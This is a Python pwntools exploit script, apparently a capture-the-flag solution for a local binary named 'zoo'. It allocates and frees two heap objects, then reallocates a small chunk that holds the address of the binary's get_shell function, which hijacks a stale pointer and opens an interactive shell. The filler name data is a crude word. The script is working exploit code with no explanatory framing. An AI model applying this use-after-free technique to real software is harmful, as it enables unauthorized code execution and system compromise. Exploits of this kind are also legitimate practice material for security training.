from pwn import * 

binary = "./zoo"
p = process(binary)
elf = ELF(binary)
context.binary = binary
context.log_level = 'debug'

s = '''
set follow-fork-mode parent
set detach-on-fork on

b * add_animal
b * remove_animal
b * add_animal+378
'''


def add_animal(p, name_size, name):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", str(name_size).encode())
    p.sendafter(b"> ", name)

def remove_animal(p, zone):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", str(zone).encode())

#gdb.attach(p, s)
add_animal(p, 0x30, "dick")
add_animal(p, 0x30, "dick")
remove_animal(p, 0) # A --> N ---> A --> N 
remove_animal(p, 1) # A --> N ---> A --> N 
add_animal(p, 0x18, p64(elf.sym['get_shell']))

p.sendlineafter(b"0) Exit", b"3")
p.sendafter(b"> ", "0")
sleep(1)
p.interactive()